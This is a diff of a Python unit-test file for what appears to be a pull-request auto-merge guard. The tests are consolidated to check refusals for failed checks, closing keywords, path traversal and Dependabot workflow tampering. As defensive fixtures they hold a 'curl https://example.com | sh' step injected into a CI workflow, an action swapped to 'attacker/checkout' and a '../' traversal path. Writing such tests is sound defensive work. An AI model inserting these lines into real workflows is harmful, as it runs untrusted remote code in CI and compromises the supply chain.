@@ -118,14 +118,10 @@ class HappyPathTests(unittest.TestCase):
         files = [file_entry(n) for n in names[:-1]] + [{"filename": names[-1], "status": "added"}]  # a png has no patch
         self.assertEqual(go(make_api(files=files))[0], 0)
 
-    def test_extra_check_runs_not_required_do_not_matter(self):
-        api = make_api(checks=[run(c) for c in REQUIRED] + [run("optional", conclusion="failure")])
-        self.assertEqual(go(api)[0], 0)
-
-    def test_latest_run_of_a_check_counts(self):
+    def test_extra_runs_do_not_matter_and_the_latest_run_of_a_check_counts(self):
         old_red = run("guards", conclusion="failure", rid=1)
-        api = make_api(checks=[old_red, run("guards", rid=2), run("tasks"), run("static")])
-        self.assertEqual(go(api)[0], 0)
+        for extra in ([run("optional", conclusion="failure")], [old_red]):  # not required; and older than the green run below
+            self.assertEqual(go(make_api(checks=[run("guards", rid=2), run("tasks"), run("static"), *extra]))[0], 0)
 
 
 class RefusalTests(unittest.TestCase):
@@ -138,50 +134,32 @@ class RefusalTests(unittest.TestCase):
     def test_head_moved_from_the_given_sha(self):
         self.refused(make_api(sha=OTHER_SHA), r"head .*" + OTHER_SHA[:7] + r".*not .*" + SHA[:7])
 
-    def test_behind_is_not_clean(self):
-        self.refused(make_api(state="behind"), r"mergeable_state.*behind")
-
-    def test_blocked_dirty_and_unknown_are_not_clean(self):
-        for state in ("blocked", "dirty", "unknown", "unstable", "draft", "has_hooks"):
+    def test_behind_blocked_dirty_and_unknown_are_not_clean(self):
+        for state in ("behind", "blocked", "dirty", "unknown", "unstable", "draft", "has_hooks"):
             with self.subTest(state=state):
                 self.refused(make_api(state=state), rf"mergeable_state.*{state}")
 
-    def test_red_required_check(self):
-        checks = [run("guards"), run("tasks", conclusion="failure"), run("static")]
-        self.refused(make_api(checks=checks), r"tasks.*failure")
-
-    def test_pending_required_check(self):
-        checks = [run("guards"), run("tasks"), run("static", status="in_progress", conclusion=None)]
-        self.refused(make_api(checks=checks), r"static.*(pending|in_progress)")
-
-    def test_missing_required_check(self):
-        self.refused(make_api(checks=[run("guards"), run("tasks")]), r"static.*(missing|no check run)")
-
-    def test_skipped_and_neutral_are_not_success(self):
-        for conclusion in ("skipped", "neutral", "cancelled", "timed_out", "action_required"):
-            with self.subTest(conclusion=conclusion):
-                checks = [run("guards"), run("tasks", conclusion=conclusion), run("static")]
-                self.refused(make_api(checks=checks), rf"tasks.*{conclusion}")
+    def test_required_check_red_pending_or_missing(self):
+        pending = run("static", status="in_progress", conclusion=None)
+        cases = [([run("guards"), run("tasks", conclusion="failure"), run("static")], r"tasks.*failure"),
+                 ([run("guards"), run("tasks"), pending], r"static.*(pending|in_progress)"),
+                 ([run("guards"), run("tasks")], r"static.*(missing|no check run)")]
+        for conclusion in ("skipped", "neutral", "cancelled", "timed_out", "action_required"):  # none of these is success
+            cases.append(([run("guards"), run("tasks", conclusion=conclusion), run("static")], rf"tasks.*{conclusion}"))
+        for checks, reason in cases:
+            with self.subTest(reason=reason):
+                self.refused(make_api(checks=checks), reason)
 
     def test_no_required_checks_configured_fails_closed(self):
         self.refused(make_api(required=[]), r"required (status )?checks")
 
-    def test_closing_keyword_in_body(self):
-        for text in ("Fixes #12", "closes #12", "This will resolve #12.", "Closed: #12", "fix owner/repo#12", "RESOLVED #12"):
-            with self.subTest(text=text):
-                self.refused(make_api(body=text), r"closing keyword")
-
-    def test_closing_keyword_in_title(self):
-        self.refused(make_api(title="Fix #12 in the plan"), r"closing keyword")
-
-    def test_closing_keyword_with_issue_url(self):
-        for host in ("https://github.com", "http://github.com", "https://www.github.com"):
-            with self.subTest(host=host):
-                self.refused(make_api(body=f"fixes {host}/bondo/listicles2/issues/12"), r"closing keyword")
-
-    def test_closing_keyword_in_a_commit_message(self):
-        commits = [{"commit": {"message": "Edit flow doc\n\nCloses #12"}}]
-        self.refused(make_api(commits=commits), r"closing keyword")
+    def test_closing_keyword_in_body_title_or_commit(self):
+        cases = [{"body": t} for t in ("Fixes #12", "closes #12", "This will resolve #12.", "Closed: #12", "fix owner/repo#12", "RESOLVED #12")]
+        cases += [{"body": f"fixes {host}/bondo/listicles2/issues/12"} for host in ("https://github.com", "http://github.com", "https://www.github.com")]
+        cases += [{"title": "Fix #12 in the plan"}, {"commits": [{"commit": {"message": "Edit flow doc\n\nCloses #12"}}]}]
+        for kwargs in cases:
+            with self.subTest(**kwargs):
+                self.refused(make_api(**kwargs), r"closing keyword")
 
     def test_prose_without_issue_number_is_fine(self):
         api = make_api(body="Fixes the typo in the prefix. Closed beta, see #12. Issue 136. Fix 12 items.")
@@ -198,24 +176,11 @@ class RefusalTests(unittest.TestCase):
         files = [file_entry("docs/tasks.toml"), file_entry("docs/product/flow.md")]
         self.refused(make_api(files=files), r"docs/product/flow\.md", kind="tasks-sync")
 
-    def test_dotdot_path_is_refused(self):
-        files = [file_entry("docs/product/../../scripts/x.py")]
-        self.refused(make_api(files=files), r"\.\.")
-
-    def test_rename_out_of_the_allowed_paths_is_refused(self):
-        files = [file_entry("docs/product/new.md", status="renamed", previous="scripts/guards.sh")]
-        self.refused(make_api(files=files), r"scripts/guards\.sh")
-
-    def test_dependabot_build_script_is_not_a_manifest(self):
-        self.refused(make_api(files=[file_entry("app/build.gradle.kts")]), r"app/build\.gradle\.kts", kind="dependabot")
-
-    def test_dependabot_workflow_change_beyond_a_pin(self):
-        patch = f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh"
-        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml.*(pin|uses)", kind="dependabot")
-
-    def test_dependabot_workflow_pin_to_a_tag_is_refused(self):
-        patch = "@@ -3 +3 @@\n-" + PIN_OLD + "\n+      - uses: actions/checkout@v7"
-        self.refused(make_api(files=[file_entry(".github/workflows/ci.yml", patch=patch)]), r"ci\.yml.*(pin|uses)", kind="dependabot")
+    def test_dotdot_path_and_rename_out_of_the_allowed_paths_are_refused(self):
+        for entry, reason in ((file_entry("docs/product/../../scripts/x.py"), r"\.\."),
+                              (file_entry("docs/product/new.md", status="renamed", previous="scripts/guards.sh"), r"scripts/guards\.sh")):
+            with self.subTest(reason=reason):
+                self.refused(make_api(files=[entry]), reason)
 
     def test_dependabot_workflow_without_a_patch_is_refused(self):
         files = [file_entry(".github/workflows/ci.yml")]
@@ -241,19 +206,14 @@ class RefusalTests(unittest.TestCase):
             with self.subTest(counts=counts):
                 self.refused(make_api(counts=counts), reason)
 
-    def pin_patch(self, old, new):
-        return file_entry(".github/workflows/ci.yml", patch=f"@@ -3 +3 @@\n-{old}\n+{new}")
-
-    def test_dependabot_swapped_action_is_refused(self):
-        evil = PIN_NEW.replace("actions/checkout", "attacker/checkout")
-        self.refused(make_api(files=[self.pin_patch(PIN_OLD, evil)]), r"ci\.yml.*(pin|uses)", kind="dependabot")
-
-    def test_dependabot_subpath_swap_is_refused(self):
-        self.refused(make_api(files=[self.pin_patch(SUB_OLD, SUB_NEW.replace("/init@", "/analyze@"))]), r"ci\.yml.*(pin|uses)", kind="dependabot")
-
-    def test_dependabot_added_or_removed_action_is_refused(self):
-        moved = f"@@ -3,3 +3,3 @@\n-{PIN_OLD}\n     with: {{}}\n+{PIN_NEW}"  # R2-02: a pin moved across context lines
-        for patch in (f"@@ -3 +3,2 @@\n {PIN_OLD}\n+{PIN_NEW}", f"@@ -3,2 +3 @@\n {PIN_NEW}\n-{PIN_OLD}", moved):
+    def test_dependabot_workflow_changes_beyond_a_repin_are_refused(self):
+        evil, other = PIN_NEW.replace("actions/checkout", "attacker/checkout"), SUB_NEW.replace("/init@", "/analyze@")
+        patches = [f"@@ -3 +3 @@\n-{PIN_OLD}\n+{evil}", f"@@ -3 +3 @@\n-{SUB_OLD}\n+{other}",  # another action or sub-path
+                   f"@@ -3,2 +3,3 @@\n-{PIN_OLD}\n+{PIN_NEW}\n+      - run: curl https://example.com | sh",  # an extra line
+                   f"@@ -3 +3 @@\n-{PIN_OLD}\n+      - uses: actions/checkout@v7",  # a tag, not a sha
+                   f"@@ -3 +3,2 @@\n {PIN_OLD}\n+{PIN_NEW}", f"@@ -3,2 +3 @@\n {PIN_NEW}\n-{PIN_OLD}",  # an added or a removed step
+                   f"@@ -3,3 +3,3 @@\n-{PIN_OLD}\n     with: {{}}\n+{PIN_NEW}"]  # R2-02: a pin moved across context lines
+        for patch in patches:
             with self.subTest(patch=patch):
                 files = [file_entry(".github/workflows/ci.yml", patch=patch)]
                 self.refused(make_api(files=files), r"ci\.yml.*(pin|uses)", kind="dependabot")
@@ -279,7 +239,8 @@ class RefusalTests(unittest.TestCase):
 
     def test_dependabot_manifests_go_to_the_owner(self):
         """R2-01: manifests whose content is not checked (a `test` script, postinstall, a requirement URL) are outside the kind."""
-        for name in ("firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt"):
+        for name in ("firebase/package.json", "firebase/package-lock.json", "gradle/libs.versions.toml", "scripts/requirements-lint.txt",
+                     "app/build.gradle.kts"):
             with self.subTest(name=name):
                 self.refused(make_api(files=[file_entry(name)]), rf"outside kind dependabot: {re.escape(name)}", kind="dependabot")
 
